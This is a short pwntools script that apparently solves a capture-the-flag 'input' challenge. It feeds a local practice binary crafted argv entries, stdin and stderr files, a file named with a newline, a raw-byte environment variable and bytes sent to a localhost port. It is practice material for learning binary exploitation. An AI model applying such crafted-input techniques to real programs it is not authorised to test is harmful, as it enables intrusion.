from pwn import *

argv=['']*100
argv[65] = "\x00"
argv[66] = "\x20\x0a\x0d"
argv[67] = '5564'

with open('./stdin', 'wb') as f:
    f.write("\x00\x0a\x00\xff")

with open('./stderr', 'wb') as f:
    f.write("\x00\x0a\x02\xff")

with open('./\x0a', 'wb') as f:
    f.write("\x00\x00\x00\x00")

p = process(cwd='/tmp/inputq', argv=argv, executable="./input", stdin=open('./stdin', 'rb'), stderr=open('./stderr', 'rb'), env={'\xde\xad\xbe\xef':'\xca\xfe\xba\xbe'})

q = remote('localhost', 5564)
q.send('\xde\xad\xbe\xef')

p.interactive()